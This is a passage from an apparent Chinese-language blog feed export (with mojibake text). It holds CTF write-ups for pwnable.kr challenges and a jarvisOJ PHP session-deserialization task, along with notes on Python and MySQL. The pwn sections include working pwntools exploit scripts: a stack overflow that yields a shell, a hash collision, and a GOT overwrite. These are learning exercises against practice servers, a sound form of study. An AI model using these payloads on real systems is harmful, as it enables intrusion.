.dynamicæ®µåœ°å€ã€æœ¬é•œåƒçš„link_mapæ•°æ®ç»“æž„åœ°å€å’Œ_dl_runtime_resolveå‡½æ•°åœ°å€ï¼›ä½†åœ¨ç¼–è¯‘æ—¶ï¼Œæ— æ³•èŽ·å–çŸ¥é“link_mapåœ°å€å’Œ_dl_runtime_resolveå‡½æ•°åœ°å€ï¼Œæ‰€ä»¥ç¼–è¯‘æ—¶å¡«é›¶åœ°å€ï¼Œè¿›ç¨‹å¯åŠ¨æ—¶ç”±åŠ¨æ€é“¾æŽ¥å™¨è¿›è¡Œå¡«å…… å‚è€ƒ èŠèŠLinuxåŠ¨æ€é“¾æŽ¥ä¸­çš„PLTå’ŒGOTï¼ˆï¼‘ï¼‰â€”â€”ä½•è°“PLTä¸ŽGOT èŠèŠLinuxåŠ¨æ€é“¾æŽ¥ä¸­çš„PLTå’ŒGOTï¼ˆï¼’ï¼‰â€”â€”å»¶è¿Ÿé‡å®šä½ èŠèŠLinuxåŠ¨æ€é“¾æŽ¥ä¸­çš„PLTå’ŒGOTï¼ˆï¼“ï¼‰â€”â€”å…¬å…±GOTè¡¨é¡¹ èŠèŠLinuxåŠ¨æ€é“¾æŽ¥ä¸­çš„PLTå’ŒGOTï¼ˆ4ï¼‰â€”â€” ç©¿é’ˆå¼•çº¿ GOT and PLT for pwning.]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwnable]]></title>
    <url>%2F2019%2F07%2F24%2Fpwnable%2F</url>
    <content type="text"><![CDATA[pwnableä»Žå°ç™½å¼€å§‹ pwnableæ˜¯ä¸€ä¸ªé€‚åˆå°ç™½çš„ç½‘ç«™ https://pwnable.kr/play.php fd æœ‰æºç ï¼š 123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char buf[32];int main(int argc, char* argv[], char* envp[])&#123; if(argc&lt;2)&#123; printf("pass argv[1] a number\n"); return 0; &#125; int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp("LETMEWIN\n", buf))&#123; printf("good job :)\n"); system("/bin/cat flag"); exit(0); &#125; printf("learn about Linux file IO\n"); return 0;&#125; è¿™é“é¢˜ç›®æ˜¯è®©ä½ äº†è§£Linuxä¸‹çš„æ–‡ä»¶æè¿°ç¬¦ 12345fd@prowl:~$ ./fd 4660LETMEWINgood job :)mommy! I think I know what a file descriptor is!!fd@prowl:~$ collision 12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned long hashcode = 0x21DD09EC;unsigned long check_password(const char* p)&#123; int* ip = (int*)p; int i; int res=0; for(i=0; i&lt;5; i++)&#123; res += ip[i]; &#125; return res;&#125;int main(int argc, char* argv[])&#123; if(argc&lt;2)&#123; printf("usage : %s [passcode]\n", argv[0]); return 0; &#125; if(strlen(argv[1]) != 20)&#123; printf("passcode length should be 20 bytes\n"); return 0; &#125; if(hashcode == check_password( argv[1] ))&#123; system("/bin/cat flag"); return 0; &#125; else printf("wrong passcode.\n"); return 0;&#125; æžœç„¶æˆ‘è¿˜æ˜¯å°ç™½ï¼Œè¿žæœ€åŸºæœ¬çš„å¸¸è¯†éƒ½ä¸æ‡‚äº†ï¼Œæ„è¯†åˆ°äº†æ˜¯ç”±è¾“å…¥çš„argv[1]æ¥è®¡ç®—çš„ï¼Œ20ä¸ªå­—èŠ‚æ­£å¥½åˆ†æˆ5æ¬¡ï¼Œå°±æ˜¯æŠŠæ¯å››ä¸ªåŠ èµ·æ¥å°±è¡Œäº†ã€‚ æ‰€ä»¥å¯ä»¥ç›´æŽ¥æ‹¿0x21DD09ECåŽ»é™¤æŽ‰5å°±å¥½äº† expå¦‚ä¸‹ï¼š 1234567from pwn import *pwn_ssh=ssh(host='pwnable.kr',user='col',password='guest',port=2222)print(pwn_ssh.connected())sh=pwn_ssh.process(argv=['collision','\xc9\xce\xc5\x06'*4+'\xc8\xce\xc5\x06'],executable='./col')print(sh.recvall()) è¿™é‡Œè¿˜å­¦åˆ°äº†ä¸€æ³¢ç”¨pwnsshè¿žæŽ¥çš„ã€‚ bof æºç ï¼š 123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;void func(int key)&#123; char overflowme[32]; printf("overflow me : "); gets(overflowme); // smash me! if(key == 0xcafebabe)&#123; system("/bin/sh"); &#125; else&#123; printf("Nah..\n"); &#125;&#125;int main(int argc, char* argv[])&#123; func(0xdeadbeef); return 0;&#125; è¿™æ˜¯ä¸€ä¸ªç®€å•çš„æ ˆæº¢å‡ºçš„é¢˜ç›® è™½ç„¶ç®€å•ï¼Œä½†æ˜¯å°ç™½è¿˜æ˜¯è¦ä»”ç»†åœ°åˆ†æžä¸€ä¸‹çš„ã€‚ funcå¯¹åº”çš„æ±‡ç¼–ä»£ç ï¼Œå…¶å®žæ„Ÿè§‰æ±‡ç¼–ä»£ç çœ‹çš„æ›´æ˜Žç™½ä¸€äº›ï¼š 12345678910111213141516171819202122.text:565D262C func proc near ; CODE XREF: main+10p.text:565D262C.text:565D262C s = byte ptr -2Ch.text:565D262C var_C = dword ptr -0Ch.text:565D262C arg_0 = dword ptr 8.text:565D262C.text:565D262C push ebp.text:565D262D mov ebp, esp.text:565D262F sub esp, 48h.text:565D2632 mov eax, large gs:14h ;gsä¿æŠ¤æœºåˆ¶.text:565D2638 mov [ebp+var_C], eax.text:565D263B xor eax, eax.text:565D263D mov dword ptr [esp], offset s ; &quot;overflow me : &quot;.text:565D2644 call near ptr puts+565D2649h.text:565D2649 lea eax, [ebp+s].text:565D264C mov [esp], eax ; s.text:565D264F call near ptr gets+565D2654h.text:565D2654 cmp [ebp+arg_0], 0CAFEBABEh.text:565D265B jnz short loc_565D266B.text:565D265D mov dword ptr [esp], offset command ; &quot;/bin/sh&quot;.text:565D2664 call near ptr system+565D2669h.text:565D2669 jmp short loc_565D2677 ä¹‹å‰ä¸€ç›´ä¸å¤ªæ˜Žç™½å¦‚æžœå±€éƒ¨å˜é‡æ˜¯æ•°ç»„è¯¥æ€Žä¹ˆæž å…³é”®æ˜¯è¿™é‡Œï¼š 12.text:565D2649 lea eax, [ebp+s].text:565D264C mov [esp], eax ; s æ³¨æ„ lea eax, [ebp+s] è¿™é‡ŒåŠ äº†æ–¹æ‹¬å·ä½†æ˜¯å…¶å®žè¿˜æ˜¯åœ°å€ï¼Œå°±æ˜¯å°†å­—ç¬¦ä¸²sçš„åœ°å€èµ‹å€¼ç»™eax ç„¶åŽå†å°†å…¶å­˜æ”¾åˆ°æ ˆé¡¶ï¼Œä¹‹åŽè°ƒç”¨getså‡½æ•°ï¼Œå°†è¾“å…¥çš„å€¼å¡«å…¥åˆ°ç¼“å†²åŒº ä»Žè¿™å¼ å›¾å°±èƒ½æ˜Žç™½å†…å­˜çš„åˆ†å¸ƒäº† è¿™é“é¢˜ç›®ä¿æŠ¤æœºåˆ¶åŸºæœ¬éƒ½å¼€äº†ï¼Œä½†æ˜¯æˆ‘ä»¬å¹¶ä¸éœ€è¦æ‰§è¡Œä»£ç ã€‚åªéœ€è¦è¦†ç›–æ ˆä¸Šçš„å€¼å°±è¡Œäº†ã€‚ä¹Ÿä¸ä¼šè§¦å‘gsä¿æŠ¤æœºåˆ¶ expå¦‚ä¸‹ï¼š 12345678from pwn import *payload = 'A'*52+'\xbe\xba\xfe\xca'r=remote('pwnable.kr',9000)print(r.connected())r.sendline(payload)r.interactive() è¿è¡Œæ•ˆæžœå¦‚ä¸‹ï¼š 12345678910111213pxy@ubuntu:~/pwnable$ python bofexp.py[+] Opening connection to pwnable.kr on port 9000: DoneTrue[*] Switching to interactive mode$ lsbofbof.cflagloglog2super.pl$ cat flagdaddy, I just pwned a buFFer :) flag è¿™é“é¢˜ç›®è¢«upxåŠ å£³ï¼ŒLinuxä¸‹çš„åŠ å£³å€’è¿˜æ˜¯ç¬¬ä¸€æ¬¡é‡åˆ°ã€‚ åˆ°è¿™é‡Œå¯ä»¥æ‰¾åˆ°è„±å£³çš„å·¥å…· è„±å£³ä¹‹åŽgdbè½½å…¥ï¼ŒæŸ¥çœ‹åæ±‡ç¼–ä»£ç  1234567891011121314151617181920pwndbg&gt; disassemble mainDump of assembler code for function main: 0x0000000000401164 &lt;+0&gt;: push rbp 0x0000000000401165 &lt;+1&gt;: mov rbp,rsp 0x0000000000401168 &lt;+4&gt;: sub rsp,0x10 0x000000000040116c &lt;+8&gt;: mov edi,0x496658 0x0000000000401171 &lt;+13&gt;: call 0x402080 &lt;puts&gt; 0x0000000000401176 &lt;+18&gt;: mov edi,0x64 0x000000000040117b &lt;+23&gt;: call 0x4099d0 &lt;malloc&gt; 0x0000000000401180 &lt;+28&gt;: mov QWORD PTR [rbp-0x8],rax 0x0000000000401184 &lt;+32&gt;: mov rdx,QWORD PTR [rip+0x2c0ee5] # 0x6c2070 &lt;flag&gt; 0x000000000040118b &lt;+39&gt;: mov rax,QWORD PTR [rbp-0x8] 0x000000000040118f &lt;+43&gt;: mov rsi,rdx 0x0000000000401192 &lt;+46&gt;: mov rdi,rax 0x0000000000401195 &lt;+49&gt;: call 0x400320 0x000000000040119a &lt;+54&gt;: mov eax,0x0 0x000000000040119f &lt;+59&gt;: leave 0x00000000004011a0 &lt;+60&gt;: ret End of assembler dump.pwndbg&gt; b *0x0000000000401184 ç„¶åŽåœ¨æ­¤å¤„ä¸‹æ–­ç‚¹ 123456789RAX 0x6c96b0 â—‚â€” 0x0RBX 0x401ae0 (__libc_csu_fini) â—‚â€” push rbxRCX 0x8RDX 0x496628 â—‚â€” push rbp /* &apos;UPX...? sounds like a delivery service :)&apos; */RDI 0x4RSI 0x0R8 0x1R9 0x3R10 0x22 å‘½ä¸­æ–­ç‚¹ä¹‹åŽå•æ­¥ä¸€æ¬¡å°±è¡Œ è¿™æ—¶å€™å°±çœ‹åˆ°å¯„å­˜å™¨çš„å˜åŒ– flagå°±æ˜¯é‚£ä¸ªæ‹‰2333 paascode å­¦åˆ°äº†ä¸€ç‚¹ä»Žè¿œç¨‹æœåŠ¡å™¨ä¸‹è½½ä¸œè¥¿çš„å‘½ä»¤ $ scp -P 2222 passcode@pwnable.kr:/home/passcode/passcode . æºç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344$ cat passcode.c #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void login()&#123; int passcode1; int passcode2; printf("enter passcode1 : "); scanf("%d", passcode1); fflush(stdin); // ha! mommy told me that 32bit is vulnerable to bruteforcing :) printf("enter passcode2 : "); scanf("%d", passcode2); printf("checking...\n"); if(passcode1==338150 &amp;&amp; passcode2==13371337)&#123; printf("Login OK!\n"); system("/bin/cat flag"); &#125; else&#123; printf("Login Failed!\n"); exit(0); &#125;&#125;void welcome()&#123; char name[100]; printf("enter you name : "); scanf("%100s", name); printf("Welcome %s!\n", name);&#125;int main()&#123; printf("Toddler's Secure Login System 1.0 beta.\n"); welcome(); login(); // something after login... printf("Now I can safely trust you that you have credential :)\n"); return 0;&#125; ä½œä¸ºä¸€åå°ç™½è¿˜æ˜¯è¦å¥½å¥½åœ°åˆ†æžæ ˆå¸§çš„æž„é€  é‚£è¦æ€Žä¹ˆåˆ†æžç¨‹åºå‘¢ï¼Ÿæœ€å…³é”®çš„è¿˜æ˜¯åˆ†æžç¨‹åºçš„äº¤äº’è¿‡ç¨‹ï¼Œæ¯•ç«Ÿæˆ‘ä»¬ä¹Ÿæ˜¯ä»Žç¨‹åºçš„è¾“å…¥å…¥æ‰‹çš„ã€‚ 12345 0x804862a &lt;welcome+33&gt; mov eax, 0x80487dd 0x804862f &lt;welcome+38&gt; lea edx, [ebp - 0x70]â–º 0x8048632 &lt;welcome+41&gt; mov dword ptr [esp + 4], edx 0x8048636 &lt;welcome+45&gt; mov dword ptr [esp], eax 0x8048639 &lt;welcome+48&gt; call __isoc99_scanf@plt &lt;0x80484a0&gt; æ­¤å¤„æ˜¯è°ƒç”¨scanfå‡½æ•°çš„è¿‡ç¨‹ï¼Œ å…ˆå°†ä¸€ä¸ªåœ°å€0x80487ddèµ‹å€¼ç»™eaxå¯„å­˜å™¨ï¼Œä¹‹åŽå°†ebp-0x70çš„åœ°å€ä¼ ç»™edxå¯„å­˜å™¨ï¼Œæ³¨æ„åˆ°è¿™é‡Œçš„æ“ä½œç¬¦æ˜¯lea ä¹‹åŽå†å°†edxå¯„å­˜å™¨çš„å€¼æ”¾åˆ°æ ˆçš„ç¬¬äºŒå±‚ï¼Œæœ€åŽå°†eaxå¯„å­˜å™¨çš„å€¼æ”¾åˆ°æ ˆé¡¶ã€‚ æ‰€ä»¥è°ƒç”¨scanfå‡½æ•°çš„æ—¶å€™ï¼Œæ ˆé¡¶æ˜¯0x80487ddï¼Œå¾€ä¸‹åŠ 4ä¸ªå­—èŠ‚å­˜å‚¨çš„æ˜¯ä¸€ä¸ªå±€éƒ¨å˜é‡å¼€å§‹çš„ä½ç½®(å°±æ˜¯å­—ç¬¦ä¸²sçš„é¦–åœ°å€) 123456 0x804862f &lt;welcome+38&gt; lea edx, [ebp - 0x70] 0x8048632 &lt;welcome+41&gt; mov dword ptr [esp + 4], edx 0x8048636 &lt;welcome+45&gt; mov dword ptr [esp], eaxâ–º 0x8048639 &lt;welcome+48&gt; call __isoc99_scanf@plt &lt;0x80484a0&gt; format: 0x80487dd â—‚â€” &apos;%100s&apos; vararg: 0xff8e7068 â—‚â€” 0x28 /* &apos;(&apos; */ è¿™æ˜¯å‚æ•°çš„ä¼ é€’è¿‡ç¨‹ æ­¤æ—¶æ ˆä¸Šçš„å¸ƒå±€ï¼š 1200:0000â”‚ esp 0xff8e7050 â€”â–¸ 0x80487dd â—‚â€” and eax, 0x73303031 /* &apos;%100s&apos; */01:0004â”‚ 0xff8e7054 â€”â–¸ 0xff8e7068 â—‚â€” 0x28 /* &apos;(&apos; */ è¿™é‡Œæœ‰ä¸€ç‚¹ç–‘æƒ‘ ç›´æŽ¥æŸ¥çœ‹å†…å­˜ 12pwndbg&gt; x/20x 0x80487dd0x80487dd: 0x30303125 0x30303125 å…¶å®žå°±æ˜¯%100çš„å°ç«¯è¡¨ç¤ºï¼ï¼ ä½†æ˜¯æ¢ä¸€ç§æ–¹å¼çœ‹ 123pwndbg&gt; x/20i 0x80487dd 0x80487dd: and eax,0x73303031 0x80487e2: add BYTE PTR [edi+0x65],dl åˆ°åº•æ˜¯æ•°æ®è¿˜æ˜¯æŒ‡ä»¤å…¨çœ‹ç¨‹åºå‘˜äº† 123456passcode@prowl:~$ python -c &quot;print &apos;A&apos;*96+&apos;\x04\xa0\x04\x08&apos;+str(0x080485d7)&quot; | ./passcodeToddler&apos;s Secure Login System 1.0 beta.enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAï¿½!enter passcode1 : Login OK!Sorry mom.. I got confused about scanf usage :(Now I can safely trust you that you have credential :) ä¸è¿‡è¿™é“é¢˜ç›®æˆ‘æ²¡æœ‰æžå¾—å¾ˆæ¸…æ¥š]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>ctf</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pythonæ–‡æ¡£é˜…è¯»ç¬”è®°1]]></title>
    <url>%2F2019%2F07%2F24%2Fpython%E6%96%87%E6%A1%A3%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B01%2F</url>
    <content type="text"><![CDATA[python å®˜æ–¹æ–‡æ¡£é˜…è¯» pythonå¯è§†åŒ–ç¼–ç¨‹ç½‘ç«™ å¾ªçŽ¯ å¾ªçŽ¯çš„é—®é¢˜ listç±»åž‹æ˜¯å¯å˜åºåˆ— 12345words = ['cat', 'window', 'defenestrate']for w in words[:]: if len(w) &gt; 6: words.insert(0, w)print(words) å¦‚æžœå°†ä¸Šè¿°ä»£ç çš„å¾ªçŽ¯è¯­å¥æ”¹ä¸ºï¼š for w in words: é‚£ä¹ˆè¿™ä¸ªå¾ªçŽ¯å°±å˜æˆäº†æ­»å¾ªçŽ¯ åŽŸå› æ˜¯wordsè¿™ä¸ªlistä¼šè¢«ä¿®æ”¹ åŒæ ·çš„å¯ä»¥çœ‹è¿™ä¸ªï¼š 12345basket = ['apple', 'orange', 'pear', 'orange', 'banana']for f in sorted(basket): print(f)print(basket) åœ¨ç»è¿‡sortedå‡½æ•°ä¹‹åŽï¼Œbasketå·²ç»è¢«ä¿®æ”¹äº† å¯ä»¥çœ‹è¿™ä¸ªï¼š &lt;iframe width=&quot;800&quot; height=&quot;500&quot; frameborder=&quot;0&quot; src=&quot;http://pythontutor.com/iframe-embed.html#code=basket%20%3D%20%5B'apple',%20'orange',%20'pear',%20'orange',%20'banana'%5D%0Afor%20f%20in%20sorted%28basket%29%3A%0A%20%20%20%20print%28f%29%0A&amp;codeDivHeight=400&amp;codeDivWidth=350&amp;cumulative=false&amp;curInstr=5&amp;heapPrimitives=nevernest&amp;origin=opt-frontend.js&amp;py=3&amp;rawInputLstJSON=%5B%5D&amp;textReferences=false&quot;&gt; &lt;/iframe&gt; åŒæ ·çš„listè¿˜æœ‰è¿™æ ·ä¸€ä¸ªé—®é¢˜ï¼š ä»£ç å¦‚ä¸‹ï¼š 1234567def f(a, L=[]): L.append(a) return Lprint(f(1))print(f(2))print(f(3)) &lt;iframe width=&quot;800&quot; height=&quot;500&quot; frameborder=&quot;0&quot; src=&quot;http://pythontutor.com/iframe-embed.html#code=def%20f%28a,%20L%3D%5B%5D%29%3A%0A%20%20%20%20L.append%28a%29%0A%20%20%20%20return%20L%0A%0Aprint%28f%281%29%29%0Aprint%28f%282%29%29%0Aprint%28f%283%29%29&amp;codeDivHeight=400&amp;codeDivWidth=350&amp;cumulative=false&amp;curInstr=15&amp;heapPrimitives=nevernest&amp;origin=opt-frontend.js&amp;py=3&amp;rawInputLstJSON=%5B%5D&amp;textReferences=false&quot;&gt; &lt;/iframe&gt; ä¿®æ”¹æˆè¿™æ ·å°±è¡Œï¼š 12345def f(a, L = None): if L is None: L = [] L.append(a) return L å¾ªçŽ¯çš„tricks dictå¾ªçŽ¯ 123knights = &#123;'gallahad':'the pure', 'robin':'the brave'&#125;for key, value in knights.items(): print(key, value) listå¾ªçŽ¯ 12for index, value in enumerate(['tac', 'tic', 'toe']): print("index = &#123;&#125;, value = &#123;&#125;".format(index, value)) ä¸¤ä¸ªlistå¾ªçŽ¯ 12345questions = ['name', 'quest', 'favorite color']answers = ['lancelot', 'the holy grail', 'blue']for q,a in zip(questions, answers): print("what is your &#123;&#125;? It is &#123;&#125;".format(q, a)) é€†å‘å¾ªçŽ¯ 123# é€†å‘å¾ªçŽ¯åºåˆ—æ—¶ï¼Œå…ˆæ­£å‘ï¼Œå†è°ƒç”¨reverse()å‡½æ•°for i in reversed(range(1, 10, 2)): print(i) æŒ‡å®šé¡ºåºå¾ªçŽ¯ï¼Œç”¨sortedå‡½æ•° å‚æ•°çš„ä¼ é€’ ä¹‹å‰è¿˜ä¸€ç›´æ²¡æ˜Žç™½pythonä¸­**paramè¿™ç§ä¼ é€’å½¢å¼çš„ç”¨æ³• è¿™ä¸ªæ —å­å°±å¾ˆæ£’å•¦ 123456789101112def cheeseshop(kind, *arguments, **keywords): print("-- Do you have any", kind, "?") print("-- I'm sorry, we're all out of", kind) for arg in arguments: print(arg) print("-" * 40) for kw in keywords: print(kw, ":", keywords[kw])cheeseshop("Limburger", "It's very runny, sir.", "It's really very, VERY runny, sir.",shopkeeper="Michael Palin", client="John Cleese", sketch="Cheese Shop Sketch") ç»“æžœå¦‚ä¸‹ï¼š 12345678-- Do you have any Limburger ?-- I&apos;m sorry, we&apos;re all out of LimburgerIt&apos;s very runny, sir.It&apos;s really very, VERY runny, sir.----------------------------------------shopkeeper : Michael Palinsketch : Cheese Shop Sketchclient : John Cleese ç¬¬ä¸€ä¸ªkindå‚æ•°å°±æ˜¯ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä¹‹åŽargumentsç›¸å½“äºŽä¸€ä¸ªæŽ¥æ”¶äº†ä¸€ä¸ªlistï¼ŒkeywordsæŽ¥æ”¶äº†ä¸€ä¸ªdict è§£åŒ…å‚æ•°åˆ—è¡¨ æ¯”å¦‚è¿™ä¸ªæ —å­ï¼š 12args = [3,6]list(range(*args)) è¾“å‡ºçš„ç»“æžœå°±æ˜¯ [3,4,5] ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥é€šè¿‡*è¿ç®—ç¬¦æ¥å¯¹ä¸€ä¸ªlistè¿›è¡Œè§£åŒ…å¹¶å°†å…¶ä½œä¸ºå‚æ•°ä¼ é€’ åŒ¿åå‡½æ•°lambda 12pairs = [(1, 'one'), (2, 'two'), (3, 'three'), (4, 'four')]pairs.sort(key=lambda pair:pair[1]) sortæ–¹æ³•æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯æŒ‡å®šå¾…æŽ’åºçš„å…³é”®å­—ï¼Œä¸€ä¸ªæ˜¯reversedï¼Œå…¶ä¸­keyç”¨ä¸€ä¸ªåŒ¿åå‡½æ•°è¿›è¡ŒæŒ‡å®šï¼Œæœ‰ä¸€ç‚¹å‡½æ•°å¼ç¼–ç¨‹çš„å‘³é“]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æŽ¢å¯»æ•°æ®åº“]]></title>
    <url>%2F2019%2F07%2F22%2F%E6%8E%A2%E5%AF%BB%E6%95%B0%E6%8D%AE%E5%BA%93%2F</url>
    <content type="text"><![CDATA[mysqlå‘½ä»¤è¡Œæ“ä½œå°ç»“ æ„Ÿè§‰è¿™äº›çŸ¥è¯†åˆå¿«å¿˜è®°äº† ç™»é™† mysql -u root -p åˆ›å»ºæ•°æ®åº“ create database databasename åˆ é™¤æ•°æ®åº“ drop database databasename ä»Žå¤–éƒ¨sqlæ–‡ä»¶å¯¼å…¥ï¼Œå¦‚æžœsqlæ–‡ä»¶ä¸­æ²¡æœ‰åˆ›å»ºæ•°æ®åº“éœ€è¦å…ˆæŒ‡å®šä¸€ä¸ªæ•°æ®åº“ç„¶åŽsource path/*.sqlå°±å¯ä»¥å¯¼å…¥äº†ï¼Œå†ä¹Ÿä¸ç”¨å—çƒ¦äººçš„phpmyadminå½±å“äº† åˆ é™¤æ•°æ®è¡¨drop table table_name å¯¼å‡ºè¡¨mysqldump -u root -p RUNOOB runoob_tbl &gt; dump.txt å¯¼å‡ºæ•°æ®åº“mysqldump -u root -p RUNOOB &gt; database_dump.txt å¤‡ä»½æ‰€æœ‰æ•°æ®åº“mysqldump -u root -p --all-databases &gt; database_dump.txt ä¸€èˆ¬sqlæ–‡ä»¶çš„å†™æ³•ï¼š 123456789drop database if exists DBName;creat database DBName;use DBName;#å¼€å§‹åˆ›å»ºè¡¨create ......#å¼€å§‹æ’å…¥æ•°æ®insert.... ä½¿ç”¨pymysqlè¿žæŽ¥æ•°æ®åº“ 1234567891011import pymsqlcon = pymysql.connect('localhost', 'root', '', 'mpsa')try: with con.cursor() as cursor: sql = 'drop database runoob' cursor.execute(sql) con.commit()finally: con.close() é‚£ä¸ªcursorå‡½æ•°æˆ‘ä¹Ÿä¸æ˜¯å¾ˆæ˜Žç™½ä¸ºä»€ä¹ˆï¼Œä¸è¿‡ä¸€èˆ¬çš„ç”¨æ³•å°±æ˜¯è¿™æ ·å•¦ phpè¿žæŽ¥æ•°æ®åº“ ä½¿ç”¨phpè¿žæŽ¥æ•°æ®åº“,åˆ›å»ºæ•°æ®åº“ï¼Œç„¶åŽåˆ é™¤ 123456789101112131415$conn = mysqli_connect($dbhost, $dbuser, $dbpass);if(!$conn)&#123; die("error!!");&#125;echo "è¿žæŽ¥æˆåŠŸ";//æŸ¥è¯¢æ•°æ®$sql = "create database runoob";$retval = mysqli_query($conn, $sql);if(!$retval)&#123; die("æŸ¥è¯¢æ•°æ®å¤±è´¥ï¼");&#125;echo "åˆ›å»ºæˆåŠŸ";$sql1 = "drop database runoob";$retval = mysqli_query($conn, $sql);mysqli_close($conn); é‡åˆ°äº†é—®é¢˜ï¼š æŸ¥äº†ä¸€ä¸‹stackoverflow çœ‹åˆ°äº†è¿™ä¸ªå›žç­”ï¼š The mysqli-&gt;connect_error property only works properly as of PHP versions 5.2.9 and 5.3.0. Use the mysqli_connect_error() function if compatibility with earlier PHP versions is required. 12345678910111213141516171819$mysqli = new mysqli('localhost', 'my_user', 'my_password', 'my_db');/* * This is the "official" OO way to do it, * BUT $connect_error was broken until PHP 5.2.9 and 5.3.0. */if ($mysqli-&gt;connect_error) &#123; die('Connect Error (' . $mysqli-&gt;connect_errno . ') ' . $mysqli-&gt;connect_error);&#125;/* * Use this instead of $connect_error if you need to ensure * compatibility with PHP versions prior to 5.2.9 and 5.3.0. */if (mysqli_connect_error()) &#123; die('Connect Error (' . mysqli_connect_errno() . ') ' . mysqli_connect_error());&#125; åŽŸæ¥æ˜¯å»ºç«‹è¿‡ç¨‹ä¸­çš„ä¸ç¨³å®šï¼Œæ€ªä¸å¾—æˆ‘æ–°å»ºçš„æ•°æ®åº“æ²¡æœ‰è¢«åˆ æŽ‰. å‚è€ƒ stackoverflowçš„å›žç­” pymysqlæ–‡æ¡£ï¼Œå†™çš„å¾ˆç®€å•]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php-challenge9]]></title>
    <url>%2F2019%2F07%2F22%2Fphp-challenge9%2F</url>
    <content type="text"><![CDATA[php-challenge 9 ç¬¬ä¸€æ¬¡æŽ¥è§¦åˆ°è¿™ä¸ªé¢˜ç›®ï¼Œè¢«æƒŠå‘†äº† 12345678910111213141516171819202122232425&lt;?php//A webshell is wait for youini_set('session.serialize_handler', 'php');session_start();class OowoO&#123; public $mdzz; function __construct() &#123; $this-&gt;mdzz = 'phpinfo();'; &#125; function __destruct() &#123; eval($this-&gt;mdzz); &#125;&#125;if(isset($_GET['phpinfo']))&#123; $m = new OowoO();&#125;else&#123; highlight_string(file_get_contents('index.php'));&#125;?&gt; åˆçœ‹æºä»£ç è§‰å¾—å¹¶æ²¡æœ‰å“ªé‡Œå¯ä»¥è®©æˆ‘ååºåˆ—åŒ–æ³¨å…¥çš„åœ°æ–¹ ä½†æ˜¯é—®é¢˜å°±å‡ºåœ¨ç¬¬ä¸€å¥è¯ï¼š ini_set('session.serialize_handler', 'php'); å…³é”®ç‚¹åœ¨äºŽï¼Œå¦‚æžœè„šæœ¬ä¸­è®¾ç½®çš„åºåˆ—åŒ–å¤„ç†å™¨ä¸Žphp.iniè®¾ç½®çš„ä¸åŒï¼Œæˆ–è€…ä¸¤ä¸ªè„šæœ¬æ³¨å†Œsessionä½¿ç”¨çš„åºåˆ—åŒ–å¤„ç†å™¨ä¸åŒï¼Œé‚£ä¹ˆå°±ä¼šå‡ºçŽ°å®‰å…¨é—®é¢˜ã€‚ åªéœ€è¦åŠ ä¸€ä¸ª|å°±è¡Œ è¿™é“jarvisOjé¢˜ç›®å°±æ˜¯è¿™ä¸ªåŽŸé¢˜ è¿™é‡Œè¿˜ç”¨åˆ°äº†å¦å¤–ä¸€ä¸ªæ¼æ´žï¼š è‡ªå·±æž„é€ ä¸€ä¸ªç½‘é¡µå¦‚ä¸‹ï¼š 12345&lt;form action="http://web.jarvisoj.com:32784/index.php" method="POST" enctype="multipart/form-data"&gt; &lt;input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" /&gt; &lt;input type="file" name="file" /&gt; &lt;input type="submit" /&gt;&lt;/form&gt; ç„¶åŽåœ¨ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œæœ¬åœ°æŠ“åŒ…ï¼Œè¿™é‡Œé‡åˆ°äº†ä¸€ç‚¹å°é—®é¢˜ï¼Œå°±æ˜¯æ²¡åŠžæ³•æŠ“åˆ°æœ¬åœ°çš„åŒ…ï¼Œå¯ä»¥é€šè¿‡ç›´æŽ¥å¯¹å±€åŸŸç½‘çš„ç½‘ç»œè¿žæŽ¥è¿›è¡Œè®¾ç½®å³å¯. æ­¤æ—¶å°±å¯ä»¥çœ‹åˆ°äº† æŽ¥ä¸‹æ¥ç»§ç»­åˆ©ç”¨ tqlã€‚ã€‚ã€‚ æœ‰è¶£çš„phpååºåˆ—åŒ–æ€»ç»“ szfszf jarvisoj-web-writeup]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[deep learning1]]></title>
    <url>%2F2019%2F07%2F21%2Fdeep-learning1%2F</url>
